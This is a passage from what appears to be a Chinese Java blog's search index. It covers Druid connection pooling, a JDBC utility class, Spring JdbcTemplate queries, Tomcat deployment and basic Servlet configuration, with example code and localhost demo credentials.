class="code"><pre><span class="line">driverClassName=com.mysql.jdbc.Driver</span><br><span class="line">url=jdbc:mysql://localhost:3306/test</span><br><span class="line">username=root</span><br><span class="line">password=123456</span><br><span class="line">#初始化连接数</span><br><span class="line">initialSize=5</span><br><span class="line">#最大连接数</span><br><span class="line">maxActive=10</span><br><span class="line">#超时时间</span><br><span class="line">maxWait=3000</span><br></pre></td></tr></table></figure><h4 id="3、连接数据库-1"><a href="#3、连接数据库-1" class="headerlink" title="3、连接数据库"></a>3、连接数据库</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//加载配置文件</span></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">resourceAsStream</span> <span class="operator">=</span> DruidTest.class.getClassLoader().getResourceAsStream(<span class="string">&quot;druid.properties&quot;</span>);</span><br><span class="line">    properties.load(resourceAsStream);</span><br><span class="line">    <span class="comment">//获取连接池对象</span></span><br><span class="line">    <span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> DruidDataSourceFactory.createDataSource(properties);</span><br><span class="line">    <span class="comment">//获取连接</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">    System.out.println(connection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、JDBC-工具类的使用"><a href="#4、JDBC-工具类的使用" class="headerlink" title="4、JDBC 工具类的使用"></a>4、JDBC 工具类的使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCUtils</span> &#123;</span><br><span class="line">    <span class="comment">//定义成员变量 DataSource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//加载配置文件</span></span><br><span class="line">            <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">            properties.load(JDBCUtils.class.getClassLoader().getResourceAsStream(<span class="string">&quot;druid.properties&quot;</span>));</span><br><span class="line">            <span class="comment">//获取连接池对象</span></span><br><span class="line">            dataSource = DruidDataSourceFactory.createDataSource(properties);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放资源</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(Statement statement, Connection connection)</span> &#123;</span><br><span class="line"><span class="comment">/*        if(statement!=null)&#123;</span></span><br><span class="line"><span class="comment">            try &#123;</span></span><br><span class="line"><span class="comment">                statement.close();</span></span><br><span class="line"><span class="comment">            &#125; catch (SQLException e) &#123;</span></span><br><span class="line"><span class="comment">                e.printStackTrace();</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(connection!=null)&#123;</span></span><br><span class="line"><span class="comment">            try &#123;</span></span><br><span class="line"><span class="comment">                connection.close();</span></span><br><span class="line"><span class="comment">            &#125; catch (SQLException e) &#123;</span></span><br><span class="line"><span class="comment">                e.printStackTrace();</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        <span class="comment">//简化</span></span><br><span class="line">        close(<span class="literal">null</span>, statement, connection);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(ResultSet resultSet, Statement statement, Connection connection)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (resultSet != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resultSet.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (statement != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                statement.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                connection.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取连接池方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DataSource <span class="title function_">getDataSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5、工具类的测试"><a href="#5、工具类的测试" class="headerlink" title="5、工具类的测试"></a>5、工具类的测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Connection connection=<span class="literal">null</span>;</span><br><span class="line">        PreparedStatement statement=<span class="literal">null</span>;</span><br><span class="line">        ResultSet resultSet=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取连接</span></span><br><span class="line">            connection=JDBCUtils.getConnection();</span><br><span class="line">            <span class="comment">//sql语句</span></span><br><span class="line">            String sql=<span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line">            statement = connection.prepareStatement(sql);</span><br><span class="line">            resultSet=statement.executeQuery();</span><br><span class="line">            <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">                <span class="type">int</span> id=resultSet.getInt(<span class="number">1</span>);</span><br><span class="line">                String user=resultSet.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                String passwd=resultSet.getString(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">                System.out.println(id+<span class="string">&quot;--&quot;</span>+user+<span class="string">&quot;--&quot;</span>+passwd);</span><br><span class="line">                <span class="comment">/*输出</span></span><br><span class="line"><span class="comment">                1--aaa--123456</span></span><br><span class="line"><span class="comment">                2--bbb--123</span></span><br><span class="line"><span class="comment">                3--ccc--111</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            JDBCUtils.close(statement,connection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="JDBCTemplate-的使用"><a href="#JDBCTemplate-的使用" class="headerlink" title="JDBCTemplate 的使用"></a>JDBCTemplate 的使用</h3><p>Spring 框架对 JDBC 的简单封装。提供了一个 JDBCTemplate 对象简化 JDBC 的开发</p><h4 id="1、jar-包的导入-1"><a href="#1、jar-包的导入-1" class="headerlink" title="1、jar 包的导入"></a>1、jar 包的导入</h4><p><img src="https://img.hacpai.com/file/2019/11/JDBCTemplate%E5%8C%85-2a1047dd.PNG" alt="JDBCTemplate 包.PNG"></p><h4 id="2、JDBCTemplate-方法的操作"><a href="#2、JDBCTemplate-方法的操作" class="headerlink" title="2、JDBCTemplate 方法的操作"></a>2、JDBCTemplate 方法的操作</h4><p>1、update()方法 ：执行增删改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//创建JdbcTemplate对象</span></span><br><span class="line">    JdbcTemplate template=<span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JDBCUtils.getDataSource());</span><br><span class="line">    <span class="comment">//调用方法</span></span><br><span class="line">    String sql=<span class="string">&quot;update users set passwd=&#x27;123&#x27; where id=?&quot;</span>;</span><br><span class="line">    <span class="type">int</span> num=template.update(sql,<span class="number">3</span>);<span class="comment">// ? 一一对应</span></span><br><span class="line">    <span class="keyword">if</span>(num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、queryForMap()：把字段名作为 key，一条数据的值作为 value 封装成一个集合，不能同时查询多条数据。<br>3、queryForList()：将查询的记录封装成 Map，再把 Map 放进 List 集合中。可以查询一条或者多条记录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//创建JdbcTemplate对象</span></span><br><span class="line">    <span class="type">JdbcTemplate</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JDBCUtils.getDataSource());</span><br><span class="line">    <span class="comment">//调用方法</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;Map&lt;String, Object&gt;&gt; maps = template.queryForList(sql);</span><br><span class="line">    <span class="keyword">for</span> (Map&lt;String, Object&gt; form : maps) &#123;</span><br><span class="line">        System.out.println(form);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、query():将查询结果封装成 JavaBean 对象。（new BeanPropertyRowMapper&lt; 类型 &gt;(类型.class)）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="keyword">private</span> String passwd;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">.........</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建JdbcTemplate对象</span></span><br><span class="line">    <span class="type">JdbcTemplate</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JDBCUtils.getDataSource());</span><br><span class="line">    <span class="comment">//调用方法</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; query = template.query(sql, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;User&gt;(User.class));</span><br><span class="line">        <span class="keyword">for</span>(User user:query)&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意： 定义实体类的时候把基本数据类型全部转换为封装类 ，否则当某一个字段的值为空，将无法进行转换。<br>5、queryForObject：将查询结果封装成对象。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c3p0 </tag>
            
            <tag> Druid </tag>
            
            <tag> JDBC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tomcat配置及Servlet入门</title>
      <link href="/posts/64929/"/>
      <url>/posts/64929/</url>
      
        <content type="html"><![CDATA[<h3 id="Web基础"><a href="#Web基础" class="headerlink" title="Web基础"></a>Web基础</h3><p>web资源分为静态和动态资源，静态资源所有用户访问得到的结果都是一摸一样的，静态资源可以直接被浏览器解析。动态资源每个用户访问相同资源后，得到的结果可能不一样，动态资源访问之后，先转换成静态资源，再返回给浏览器。</p><blockquote><p>什么是静动分离？<br>动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路</p></blockquote><blockquote><p>为什么要静动分离？<br>当我们去访问网站的时候，有些请求是后台处理，而有些请求则不需要后台处理，为了减少资源的访问次数，所以采用静动分离，提高网站吞吐量。</p></blockquote><p>通信三要素</p><ul><li>IP</li><li>端口</li><li>协议</li></ul><p>常见的java服务器软件</p><ul><li>webLogic</li><li>webSphere</li><li>JBOSS</li><li>Tomcat</li></ul><h3 id="tomcat-配置"><a href="#tomcat-配置" class="headerlink" title="tomcat 配置"></a>tomcat 配置</h3><p>下载地址<code>http://tomcat.apache.org/</code><br>安装:直接解压即可 （注意：安装目录不要有中文和空格）</p><p>目录结构<br><img src="https://img.hacpai.com/file/2019/11/tomcat%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84-83f00ee6.png" alt="tomcat目录结构.png"></p><p>启动 文件目录下的bin目录中的<code>startup.bat</code>文件双击运行 ，Linux有<code>startup.sh</code>文件<br>出现的问题主要有运行窗口一闪而过（原因：java环境配置问题。正确配置JAVA_HOME环境）和启动报错（端口占用问题。）</p><p>部署项目的方式<br>1、直接放在webapps目录下或者将项目打包成war包，在将包放在webapps目录下（war自动解压）<br>2、配置conf&#x2F;server.xml文件，在<Host>标签体中配置<code>&lt;Context docBase=&quot;项目存放的路径&quot; path=&quot;访问路径 &quot; /&gt;</code><br>3、在conf\Catalina\localhost创建任意名称的xml文件。在文件中编写<code>&lt;Context docBase=&quot;项目存放的路径&quot; /&gt;</code> 访问的虚拟目录就是XML文件的文件名</p><h3 id="Servlet-入门"><a href="#Servlet-入门" class="headerlink" title="Servlet 入门"></a>Servlet 入门</h3><h4 id="实现Servlet接口"><a href="#实现Servlet接口" class="headerlink" title="实现Servlet接口"></a>实现Servlet接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo01</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 初始化方法，在Servlet被创建时执行，只执行一次</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> servletConfig</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ServletException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取ServletConfig对象，ServletConfig ：Servlet的配置对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供服务的方法，每一次Servlet被访问时都会执行。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> servletRequest</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> servletResponse</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ServletException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取Servlet的一些信息，例如：版本、作者等等。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 销毁的方法，当服务器正常关闭时执行。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="在web-xml中配置Servlet"><a href="#在web-xml中配置Servlet" class="headerlink" title="在web.xml中配置Servlet"></a>在web.xml中配置Servlet</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;ServletDemo01&lt;/servlet-name&gt; //类名</span><br><span class="line">    &lt;servlet-class&gt;com.stranger.servlet.ServletDemo01&lt;/servlet-class&gt; //类路径</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;ServletDemo01&lt;/servlet-name&gt;//类名</span><br><span class="line">    &lt;url-pattern&gt;/demo01&lt;/url-pattern&gt;//  格式 “/name”  访问名字</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>当服务器接受到请求之后，会解析请求的url路径，获取Servlet的资源路径，然后去查找web.xml文件，是否有对应的<url-pattern>标签体内容，然后查找类名,找到之后把字节码文件加载到内存调用方法。<br><img src="https://img.hacpai.com/file/2019/11/Servlet%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86-5d47a4a9.PNG" alt="Servlet执行原理.PNG"></p><h4 id="注解配置Servlet"><a href="#注解配置Servlet" class="headerlink" title="注解配置Servlet"></a>注解配置Servlet</h4><p>servlet3.0及以上就可以使用直接使用注解快速配置了，不在创建web.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> WebServlet &#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String[] value() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    String[] urlPatterns() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">loadOnStartup</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    WebInitParam[] initParams() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">asyncSupported</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">smallIcon</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">largeIcon</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">description</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">displayName</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接在类上使用<code>@WebServlet</code>注解进行配置。（<code>@WebServlet(&quot;资源路径（访问路径）&quot;)</code>）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/demo2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo02</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Servlet </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
